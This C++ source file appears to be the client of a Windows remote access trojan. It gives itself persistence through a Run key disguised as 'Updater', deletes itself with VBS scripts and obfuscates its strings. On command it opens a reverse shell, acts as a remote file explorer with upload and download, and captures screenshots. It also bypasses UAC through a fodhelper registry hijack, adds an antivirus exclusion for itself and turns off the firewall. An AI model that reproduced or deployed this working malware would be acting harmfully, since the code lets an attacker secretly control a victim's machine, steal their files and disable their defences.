#pragma once

atomic<bool> VibeMouseController = false;

bool IsInstalled()
{
	RegUtils ru;

	return (ru.RegRead("SOFTWARE\\Windows Update", "Install State", REG_SZ) == "true");	
}

short InstallClient()
{
	Settaggi sett;
	RegUtils ru;
	SystemUtils su;
	DirUtils du;

	string RemVBS = "";

	sett.InstallSettings();

	string PathToCopy = sett.InstallPath + "\\" + sett.ExeName;

	if (PathToCopy.find("<User>") != string::npos)
		PathToCopy = PlaceHolder(PathToCopy, "<User>", su.GetCurrentUser());

	ru.RegDelValue(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");

	if (sett.RegStartup)
		if (!ru.RegWrite(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater", REG_SZ, ("\"" + PathToCopy + "\"").c_str()))
			return 2;

	if (ToLowerCase(du.GetFullModuleFilePath()) != ToLowerCase(PathToCopy))
	{
		if (DEBUG)
			cout << PathToCopy << " <- " << du.GetFullModuleFilePath() << endl;

		du.DelFile(PathToCopy);
		if (!du.CopyPasteFile(du.GetFullModuleFilePath(), PathToCopy))
			return 3;

		RemVBS += "WScript.Sleep 1000\n";
		RemVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
		RemVBS += "filesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\n";
		RemVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Rem.vbs\"";

		du.WriteFile(du.GetModuleFilePath() + "Rem.vbs", RemVBS);

		if(!DEBUG)
			su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Rem.vbs\"");
	}

	if (!ru.RegWrite("SOFTWARE\\Windows Update", "Install State", REG_SZ, "true"))
		return 4;

	su.RunExe(PathToCopy);

	return 0;
}

json DirFileTOjson(VectDirFile DirFiles)
{
	Encode en;
	DirUtils du;
	json j;

	for (int i = 0; i < DirFiles.size(); i++)
	{
		if (DirFiles[i].Name == ".")
			DirFiles.erase(DirFiles.begin() + i);

		DirFiles[i].Name = en.AsciiToUnicode(DirFiles[i].Name);

		j["Files"][i]["Type"] = (DirFiles[i].Type == 1);
		j["Files"][i]["Name"] = (j["Files"][i]["Type"]) ? DirFiles[i].Name : DirFiles[i].Name + "\\";
		j["Files"][i]["Path"] = (du.GetCurrDir().size() == 3) ? en.AsciiToUnicode(du.GetCurrDir()) : en.AsciiToUnicode(du.GetCurrDir()) + "\\";
		j["Files"][i]["FullPath"] = (du.GetCurrDir().size() == 3) ? en.AsciiToUnicode(du.GetCurrDir()) + DirFiles[i].Name : en.AsciiToUnicode(du.GetCurrDir()) + "\\" + DirFiles[i].Name;
		j["Files"][i]["Size"] = (j["Files"][i]["Type"]) ? du.GetSizeOfFile(en.UnicodeToAscii(j["Files"][i]["FullPath"])) : 0;
		j["Files"][i]["LastEdit"] = du.GetTimeOfFile(en.UnicodeToAscii(j["Files"][i]["FullPath"])).LastWriteTime;
	}

	return j;
}

void VibeMouseAsync()
{
	MouseUtils mu;
	SystemUtils su;

	while (VibeMouseController)
	{
		POINT p = mu.GetMousePos();

		p.x += (su.GetRandomNumber(2) == 0) ? su.GetRandomNumber(10) : -su.GetRandomNumber(10);
		p.y += (su.GetRandomNumber(2) == 0) ? su.GetRandomNumber(10) : -su.GetRandomNumber(10);

		mu.SetMousePos(p);

		Sleep(1);
	}
}

// COMANDI

bool GetInfo(SOCKET Sock)
{
    SystemUtils su;
    DirUtils du;
	WindowUtils wu;
	Settaggi sett;

	sett.GetSettingsFromReg();

	json j;

    j["IPL"] = TcpIP::GetLocalIP(Sock);
    j["CPU"] = to_string((int)su.GetCPUload()) + "%";
    j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
	j["ACTWIN"] = wu.GetWindowTitle();
	j["INSTDATE"] = sett.InstallDate;

	return COMUNICAZIONI::GetInfo(Sock, j.dump());
}

bool InvertMouse(SOCKET Sock)
{
	MouseUtils mu;

	return COMUNICAZIONI::InvertMouse(Sock, mu.InvertMouseButtons());
}

bool UpdateClient(SOCKET Sock)
{
	DirUtils du;
	SystemUtils su;
	RegUtils ru;
	COMUNICAZIONI::NewClient NewClient;

	string FMFP = du.GetFullModuleFilePath();
	string MFP = du.GetModuleFilePath();
	string MF = du.GetModuleFile();
	string UpdateVBS = "";

	NewClient = COMUNICAZIONI::UpdateClient(Sock);

	if (NewClient.j.dump() == "null")
		return false;

	if (!du.CheckDir(MFP + "VXBkYXRl"))
		du.MakeDir(MFP + "VXBkYXRl");

	if (!du.WriteBinaryFile(MFP + "VXBkYXRl\\" + MF, NewClient.Str))
		return false;

	if (NewClient.j["Hidden"])
		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +h \"") + MFP + "VXBkYXRl\\" + MF + "\"");
	if (NewClient.j["System"])
		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +s \"") + MFP + "VXBkYXRl\\" + MF + "\"");

	UpdateVBS += "WScript.Sleep 1500\n";
	UpdateVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
	UpdateVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
	UpdateVBS += "filesys.DeleteFile \"" + FMFP + "\"\n";
	UpdateVBS += "filesys.MoveFile \"" + MFP + "VXBkYXRl\\" + MF + "\", \"" + FMFP + "\"\n";
	UpdateVBS += "WScript.Sleep 1000\n";
	UpdateVBS += "WshShell.Run \"\"\"" + FMFP + "\"\"\", 1, false\n";
	UpdateVBS += "filesys.DeleteFolder \"" + MFP + "VXBkYXRl\"\n";
	UpdateVBS += "filesys.DeleteFile \"" + MFP + "Update.vbs\"";

	if (!du.WriteFile(MFP + "Update.vbs", UpdateVBS))
		return false;

	ru.RegDelKey("SOFTWARE\\Windows Update");

	su.NoOutputCMD("start \"\" \"" + MFP + "Update.vbs\"");

	return true;
}

void Uninstall()
{
	RegUtils ru;
	DirUtils du;
	SystemUtils su;

	string RemoveVBS = "";

	ru.RegDelKey("SOFTWARE\\Windows Update");
	ru.RegDelValue(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");

	RemoveVBS += "WScript.Sleep 5000\n";
	RemoveVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
	RemoveVBS += "filesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\n";
	RemoveVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Remove.vbs\"";

	du.WriteFile(du.GetModuleFilePath() + "Remove.vbs", RemoveVBS);
	du.RunFile(du.GetModuleFilePath() + "Remove.vbs");
}

void RestartClient()
{
	DirUtils du;
	SystemUtils su;

	su.RunExe(du.GetFullModuleFilePath());
}

void ReverseShell(SOCKET Sock)
{
	DirUtils du;
	SystemUtils su;
	
	string Cmd;
	string Res = "OK";
	string Path = du.GetModuleFilePath(false);
	
	du.SetCurrDir(Path);
	
	while (true)
	{
		Cmd = COMUNICAZIONI::PingPong(Sock, Res);
		
		if (Cmd == "")
			return;
		else if (Cmd == "Get cd")
			Res = Path;
		else if (ToLowerCase(Cmd).find("chdir") != string::npos)
		{
			if (ToLowerCase(Cmd) == "chdir .." || ToLowerCase(Cmd) == "chdir..")
			{
				if (Path.size() > 3)
					Path = Path.substr(0, Path.find_last_of("\\"));
				if (Path.size() == 2)
					Path += "\\";

				du.SetCurrDir(Path);
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd).find("/d") != string::npos && ToLowerCase(Cmd.substr(0, 9)) == "chdir /d ")
			{
				if (Cmd.find("\"") != string::npos)
				{
					if (du.SetCurrDir(Cmd.substr(10, Cmd.find_last_of("\"") - 10)))
						Path = du.GetCurrDir();
				}
				else
					if (du.SetCurrDir(Cmd.substr(9)))
						Path = du.GetCurrDir();
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd.substr(0, 6)) == "chdir ")
			{
				if (Cmd.find("\"") != string::npos)
				{
					if (du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7)))
						Path = du.GetCurrDir();
				}
				else
					if (du.SetCurrDir(Cmd.substr(6)))
						Path = du.GetCurrDir();
				
				Res = "\n";
			}
			else
				Res = su.GetCMDOutput(Cmd);
		}
		else if (ToLowerCase(Cmd).find("cd") != string::npos)
		{
			if (ToLowerCase(Cmd) == "cd .." || ToLowerCase(Cmd) == "cd..")
			{
				if (Path.size() > 3)
					Path = Path.substr(0, Path.find_last_of("\\"));
				if (Path.size() == 2)
					Path += "\\";

				du.SetCurrDir(Path);
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd).find("/d") != string::npos && ToLowerCase(Cmd.substr(0, 6)) == "cd /d ")
			{
				if (Cmd.find("\"") != string::npos)
				{
					if (du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7)))
						Path = du.GetCurrDir();
				}
				else
					if (du.SetCurrDir(Cmd.substr(6)))
						Path = du.GetCurrDir();
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd.substr(0, 3)) == "cd ")
			{
				if (Cmd.find("\"") != string::npos)
				{
					if (du.SetCurrDir(Cmd.substr(4, Cmd.find_last_of("\"") - 4)))
						Path = du.GetCurrDir();
				}
				else
					if (du.SetCurrDir(Cmd.substr(3)))
						Path = du.GetCurrDir();
				
				Res = "\n";
			}
			else
				Res = su.GetCMDOutput(Cmd);
		}
		else if (ToLowerCase(Cmd) == "exit")
		{
			TcpIP::SendString(Sock, (string)AY_OBFUSCATE("Reverse shell closed"));
			return;
		}
		else if (ToLowerCase(Cmd).substr(0, 7) == "notepad")
		{
			su.AsyncCMD(Cmd);
			Res = "\n";
		}
		else
			Res = su.GetCMDOutput(Cmd) + "\n";
	}
}

void FileExplorer(SOCKET Sock)
{
	SystemUtils su;
	DirUtils du;
	Encode en;
	string Buff = "";
	string Res = "";
	json j;

	VectDirFile DirFiles;

	du.SetCurrDir(du.GetModuleFilePath());
	du.GetDir(du.GetCurrDir(), DirFiles);
	
	j = DirFileTOjson(DirFiles);

	if (DEBUG)
		cout << j.dump() << endl;

	Buff = COMUNICAZIONI::PingPong(Sock, j.dump());

	for (bool b = true; b;)
	{
		if (Buff == "")
			break;

		j.clear();
		j = json::parse(Buff);

		if (j["Action"] == "Exit")
			break;
		else if (j["Action"] == "OpenDir")
		{
			DirFiles.clear();

			if (du.SetCurrDir(en.UnicodeToAscii(j["Path"])))
			{
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
		}
		else if (j["Action"] == "RunFile")
		{
			DirFiles.clear();

			du.RunFile(en.UnicodeToAscii(j["Path"]));
			du.GetDir(du.GetCurrDir(), DirFiles);

			j.clear();
			j = DirFileTOjson(DirFiles);

			Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
		}
		else if (j["Action"] == "GoUp")
		{
			DirFiles.clear();

			if (du.SetCurrDir(du.GetCurrDir() + "\\.."))
			{
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
		}
		else if (j["Action"] == "Delete")
		{
			bool Success = false;

			DirFiles.clear();

			if (j["Type"])
				Success = du.DelFile(en.UnicodeToAscii(j["Path"]));
			else
				Success = du.DelDir(en.UnicodeToAscii(j["Path"]));

			if (Success)
			{
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
			{
				if (DEBUG)
				{
					char errmsg[256];
					strerror_s(errmsg, 256, errno);
					cout << errmsg << endl;
				}
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
		}
		else if (j["Action"] == "Refresh")
		{
			DirFiles.clear();
			du.GetDir(du.GetCurrDir(), DirFiles);

			j.clear();
			j = DirFileTOjson(DirFiles);

			Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
		}
		else if (j["Action"] == "Rename")
		{
			DirFiles.clear();

			if (du.RenameFileOrDir(en.UnicodeToAscii(j["OldName"]), en.UnicodeToAscii(j["NewName"])))
			{
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
			{
				if (DEBUG)
				{
					char errmsg[256];
					strerror_s(errmsg, 256, errno);
					cout << errmsg << endl;
				}
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
		}
		else if (j["Action"] == "Upload")
		{
			string FileName;
			string FileContent;

			DirFiles.clear();

			if (!COMUNICAZIONI::DownloadFileWithLoading(Sock, FileName, FileContent))
				break;

			if (du.WriteBinaryFile(FileName, FileContent))
			{
				Buff = COMUNICAZIONI::PingPong(Sock, "OK");
			}
			else
			{
				if (DEBUG)
				{
					char errmsg[256];
					strerror_s(errmsg, 256, errno);
					cout << errmsg << endl;
				}
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
		}
		else if (j["Action"] == "Download")
		{
			string FilePath = en.UnicodeToAscii(j["Path"]);
			string FileName = FilePath.substr(FilePath.find_last_of("\\") + 1);

			if (!COMUNICAZIONI::UploadFileWithLoading(Sock, FileName, du.GetBinaryFileContent(FilePath)))
				break;

			if (!TcpIP::RecvString(Sock, Buff))
				break;
		}
		else if (j["Action"] == "Makedir")
		{
			DirFiles.clear();

			if (du.MakeDir(en.UnicodeToAscii(j["Path"])))
			{
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
			{
				if (DEBUG)
				{
					char errmsg[256];
					strerror_s(errmsg, 256, errno);
					cout << errmsg << endl;
				}
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
		}
		else if (j["Action"] == "Makefile")
		{
			DirFiles.clear();

			if (du.WriteFile(en.UnicodeToAscii(j["Path"])))
			{
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
			{
				if (DEBUG)
				{
					char errmsg[256];
					strerror_s(errmsg, 256, errno);
					cout << errmsg << endl;
				}
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
		}
		else if (j["Action"] == "CopyCut")
		{
			bool Success = false;

			DirFiles.clear();

			if (j["CutOrCopy"])
			{
				if (j["Type"])
					Success = du.CopyPasteFile(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
				else
				{
					du.CopyPasteDir(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
					Success = true; // Grazie C++17, bella cagata...
				}
			}
			else
				if (j["Type"])
					Success = du.CutFile(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
				else
					Success = du.CutDir(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);

			if (Success)
			{
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
			{
				if (DEBUG)
				{
					char errmsg[256];
					strerror_s(errmsg, 256, errno);
					cout << errmsg << endl;
				}
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
		}
		else if (j["Action"] == "ChangePartition")
		{
			DirFiles.clear();
			du.GetDir(du.GetCurrDir(), DirFiles);

			VectString Drives = du.GetDriveLetters();

			j.clear();

			for (int i = 0; i < Drives.size(); i++)
			{
				j["Files"][i]["Type"] = false;
				j["Files"][i]["Name"] = Drives[i];
				j["Files"][i]["Path"] = Drives[i];
				j["Files"][i]["FullPath"] = Drives[i];
				j["Files"][i]["Size"] = 0;
				j["Files"][i]["LastEdit"] = 0;
			}

			Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
		}
		else if (j["Action"] == "Zip")
		{
			if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell Compress-Archive '") + en.UnicodeToAscii(j["Path"]) + "' '" + en.UnicodeToAscii(j["Name"]) + ".zip' -force") == 0)
			{
				DirFiles.clear();
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
			{
				if (DEBUG)
				{
					char errmsg[256];
					strerror_s(errmsg, 256, errno);
					cout << errmsg << endl;
				}
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
		}
		else if (j["Action"] == "Unzip")
		{
			if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell Expand-Archive '") + en.UnicodeToAscii(j["Path"]) + "' -force") == 0)
			{
				DirFiles.clear();
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
			{
				if (DEBUG)
				{
					char errmsg[256];
					strerror_s(errmsg, 256, errno);
					cout << errmsg << endl;
				}
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
		}
		else
			break;
	}
}

bool BypassUAC(SOCKET Sock)
{
	bool Success = true;
	DirUtils du;
	RegUtils ru;
	SystemUtils su;

	string EmergencyVBS = "WScript.Sleep 15000\n";
	EmergencyVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
	EmergencyVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
	EmergencyVBS += "WshShell.Run \"\"\"" + du.GetFullModuleFilePath() + "\"\"\", 1, false\n";
	EmergencyVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Emer.vbs\"";
	
	du.WriteFile(du.GetModuleFilePath() + "Emer.vbs", EmergencyVBS);
	du.WriteFile(du.GetModuleFilePath() + "Aele");

	du.RunFile(du.GetModuleFilePath() + "Emer.vbs");

	if(!ru.RegMakeKey(AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command")))
		Success = false;
	if(!ru.RegWrite(AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"), "", REG_SZ, ((string)AY_OBFUSCATE("cmd /c start \"\" \"") + du.GetFullModuleFilePath() + "\"").c_str()))
		Success = false;
	if(!ru.RegMakeKey(AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer")))
		Success = false;
	if(!ru.RegWrite(AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer"), "", REG_SZ, AY_OBFUSCATE(".pwn")))
		Success = false;
	
	if (Success)
		su.AsyncCMD((string)AY_OBFUSCATE("powershell Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden"));
	
	Sleep(6000);
	
	ru.RegDelKey(AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer"));
	ru.RegDelKey(AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"));
	
	du.WriteFile(du.GetModuleFilePath() + "AeleSA");

	if (du.CheckFile(du.GetModuleFilePath() + "AeleOK"))
	{
		TcpIP::SendString(Sock, "OK");
		Sleep(500);
		return true;
	}
	
	TcpIP::SendString(Sock, "NO");
	return false;
}

bool VibeMouse(SOCKET Sock)
{
	if (VibeMouseController)
	{
		VibeMouseController = false;
		return TcpIP::SendString(Sock, "b");
	}
	else
	{
		VibeMouseController = true;
		thread tVMA(VibeMouseAsync);
		tVMA.detach();

		return TcpIP::SendString(Sock, "a");
	}

	return false;
}

bool AddAVexclusion(SOCKET Sock)
{
	SystemUtils su;
	DirUtils du;

	if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell -inputformat none -outputformat none -NonInteractive -Command \"Add-MpPreference -ExclusionProcess '") + du.GetFullModuleFilePath() + "'\"") == 0)
	{
		return TcpIP::SendString(Sock, "ok");
	}

	return TcpIP::SendString(Sock, "ko");
}

bool DisableFirewall(SOCKET Sock)
{
	SystemUtils su;
	DirUtils du;

	if (su.NoOutputCMD((string)AY_OBFUSCATE("netsh advfirewall set allprofiles state off")) == 0)
	{
		return TcpIP::SendString(Sock, "ok");
	}

	return TcpIP::SendString(Sock, "ko");
}



BITMAPINFOHEADER createBitmapHeader(int width, int height)
{
	BITMAPINFOHEADER  bi{};

	// create a bitmap
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = width;
	bi.biHeight = -height;  //this is the line that makes it draw upside down or not
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	return bi;
}

Mat captureScreenMat(HWND hwnd)
{
	Mat src;
	WindowUtils wu(hwnd);

	// get handles to a device context (DC)
	HDC hwindowDC = GetDC(0);
	HDC hwindowCompatibleDC = CreateCompatibleDC(hwindowDC);

	// define scale, height and width
	int screenx = wu.GetWindowPos().X;
	int screeny = wu.GetWindowPos().Y;
	int width = wu.GetWindowSize().X;
	int height = wu.GetWindowSize().Y;

	// create mat object
	src.create(height, width, CV_8UC4);

	// create a bitmap
	HBITMAP hbwindow = CreateCompatibleBitmap(hwindowDC, width, height);
	BITMAPINFOHEADER bi = createBitmapHeader(width, height);

	// use the previously created device context with the bitmap
	SelectObject(hwindowCompatibleDC, hbwindow);

	// copy from the window device context to the bitmap device context
	BitBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, screenx, screeny, SRCCOPY);

	// Draw the mouse
	CURSORINFO cursor = { sizeof(cursor) };
	GetCursorInfo(&cursor);
	if (cursor.flags == CURSOR_SHOWING)
	{
		DrawIcon(hwindowCompatibleDC, cursor.ptScreenPos.x, cursor.ptScreenPos.y, cursor.hCursor);
	}

	//copy from hwindowCompatibleDC to hbwindow
	GetDIBits(hwindowCompatibleDC, hbwindow, 0, height, src.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

	// avoid memory leak
	DeleteDC(hwindowCompatibleDC);
	ReleaseDC(hwnd, hwindowDC);
	DeleteObject(hbwindow);

	return src;
}

string compress_string(const string& str, int compressionlevel = Z_BEST_COMPRESSION)
{
	z_stream zs;                        // z_stream is zlib's control structure
	memset(&zs, 0, sizeof(zs));

	if (deflateInit(&zs, compressionlevel) != Z_OK)
		throw(std::runtime_error("deflateInit failed while compressing."));

	zs.next_in = (Bytef*)str.data();
	zs.avail_in = str.size();           // set the z_stream's input

	int ret;
	char outbuffer[32768] = { 0 };
	std::string outstring;

	// retrieve the compressed bytes blockwise
	do {
		zs.next_out = reinterpret_cast<Bytef*>(outbuffer);
		zs.avail_out = sizeof(outbuffer);

		ret = deflate(&zs, Z_FINISH);

		if (outstring.size() < zs.total_out) {
			// append the block to the output string
			outstring.append(outbuffer,
				zs.total_out - outstring.size());
		}
	} while (ret == Z_OK);

	deflateEnd(&zs);

	if (ret != Z_STREAM_END) {          // an error occurred that was not EOF
		std::ostringstream oss;
		oss << "Exception during zlib compression: (" << ret << ") " << zs.msg;
		throw(std::runtime_error(oss.str()));
	}

	return outstring;
}

bool Screenshot(SOCKET Sock)
{
	HWND hwnd = GetDesktopWindow();
	Mat Desktop = captureScreenMat(hwnd);
	vector<uchar> vect;
	string Buff;

	Desktop = captureScreenMat(hwnd);
	imencode(".jpeg", Desktop, vect, { IMWRITE_JPEG_QUALITY, 100 });

	Buff = string(vect.begin(), vect.end());
	Buff = compress_string(Buff);

	bool Result = TcpIP::SendString(Sock, Buff);

	vect.clear();
	Buff.clear();

	return Result;
}



short Sessione(TcpIP Client)
{
	SystemUtils su;
	string cmd = "";

	for (bool i = true; i;)
	{
		cmd = Client.RecvString();

		if (cmd == "")
			i = false;
		else if (cmd == "getinfo")
		{
			i = GetInfo(Client.Sock);
		}
		else if (cmd == "invertmouse")
		{
			i = InvertMouse(Client.Sock);
		}
		else if (cmd == "reconnect")
		{
			i = false;
		}
		else if (cmd == "kill")
		{
			return 1;
		}
		else if (cmd == "shutdown")
		{
			su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -s -f -t 0"));
		}
		else if (cmd == "reboot")
		{
			su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -r -f -t 0"));
		}
		else if (cmd == "updateclient")
		{
			if (UpdateClient(Client.Sock))
				return 1;
		}
		else if (cmd == "uninstall")
		{
			Uninstall();
			return 1;
		}
		else if (cmd == "restart")
		{
			RestartClient();
			return 1;
		}
		else if (cmd == (string)AY_OBFUSCATE("reverseshell"))
		{
			ReverseShell(Client.Sock);
		}
		else if (cmd == "fileexplorer")
		{
			FileExplorer(Client.Sock);
		}
		else if (cmd == (string)AY_OBFUSCATE("bypassuac"))
		{
			if (BypassUAC(Client.Sock))
				return 1;
		}
		else if (cmd == "vibemouse")
		{
			i = VibeMouse(Client.Sock);
		}
		else if (cmd == "addexclusion")
		{
			i = AddAVexclusion(Client.Sock);
		}
		else if (cmd == "disablefw")
		{
			i = DisableFirewall(Client.Sock);
		}
		else if (cmd == "screenshot")
		{
			i = Screenshot(Client.Sock);
		}
	}

	return 0;
}